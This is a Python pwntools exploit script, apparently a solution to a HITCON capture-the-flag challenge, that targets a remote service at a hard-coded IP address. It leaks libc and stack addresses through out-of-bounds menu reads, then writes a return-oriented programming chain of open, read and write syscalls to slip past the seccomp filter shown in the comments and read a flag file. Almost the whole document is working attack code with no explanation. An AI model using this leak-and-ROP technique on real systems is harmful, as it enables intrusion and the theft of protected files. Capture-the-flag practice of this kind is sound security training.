#!/usr/bin/env python
from pwn import *

# hitcon{why_libseccomp_cheated_me_Q_Q}

context.arch = 'amd64'

l = ELF('./libc.so.6')



host , port = '52.192.178.153' , 31337
y = remote( host , port )

def see( idx ):
    y.sendlineafter( '?' , '1' )
    y.sendlineafter( '?' , str( idx ) )

def mmo( idx , data ):
    y.sendlineafter( '?' , '2' )
    y.sendlineafter( '?' , str( idx ) )
    y.sendlineafter( ':' , str( data ) )

#https://github.com/david942j/seccomp-tools
'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018
 0002: 0x20 0x00 0x00 0x00000020  A = args[2]
 0003: 0x07 0x00 0x00 0x00000000  X = A
 0004: 0x20 0x00 0x00 0x00000000  A = sys_number
 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019
 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019
 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011
 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014
 0011: 0x87 0x00 0x00 0x00000000  A = X
 0012: 0x54 0x00 0x00 0x00000001  A &= 0x1
 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019
 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019
 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019
 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019
 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019
 0018: 0x06 0x00 0x00 0x00000000  return KILL
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
'''


syscall = 0xbc765
pop_rax = 0x3a998
pop_rdi = 0x1fd7a
pop_rsi = 0x1fcbd
pop_rdx = 0x1b92
pop_r10 = 0x116d45

# /home/ar tifact/f lag

mmo( 0 , u64( '/home/ar' ) )
mmo( 1 , u64( 'tifact/f' ) )
mmo( 2 , u64( 'lag'.ljust( 8 , '\x00' ) ) )

see( 203 )

y.recvuntil( ': ' )
l.address += int( y.recvline().strip() , 10 ) - 0x203f1
log.success( 'libc -> %s' % hex( l.address ) )

see( 200 )
y.recvuntil( ': ' )
stk = int( y.recvline().strip() , 10 ) - 0x730
log.success( 'stk -> %s' % hex( stk ) )


'''
mmo( 203 , l.address + one )
#mmo( 203 , l.symbols['system'] )
#print hex( l.address + one )

for i in xrange( 10 ):
    print i
    mmo( 204 + i , 0 )
'''

mmo( 203 , l.address + pop_rdi )
mmo( 204 , stk )
mmo( 205 , l.address + pop_rsi )
mmo( 206 , 0x0 )
mmo( 207 , l.address + pop_rdx )
mmo( 208 , 2 )
mmo( 209 , l.address + pop_rax )
mmo( 210 , 2 )
mmo( 211 , l.address + syscall )

mmo( 212 , l.address + pop_rdi )
mmo( 213 , 3 )
mmo( 214 , l.address + pop_rsi )
mmo( 215 , stk + 0x20 )
mmo( 216 , l.address + pop_rdx )
mmo( 217 , 0x70 )
mmo( 218 , l.address + pop_rax )
mmo( 219 , 0 )
mmo( 220 , l.address + syscall )

mmo( 221 , l.address + pop_rdi )
mmo( 222 , 1 )
mmo( 223 , l.address + pop_rsi )
mmo( 224 , stk + 0x20 )
mmo( 225 , l.address + pop_rdx )
mmo( 226 , 0x70 )
mmo( 227 , l.address + pop_rax )
mmo( 228 , 1 )
mmo( 229 , l.address + syscall )

y.interactive()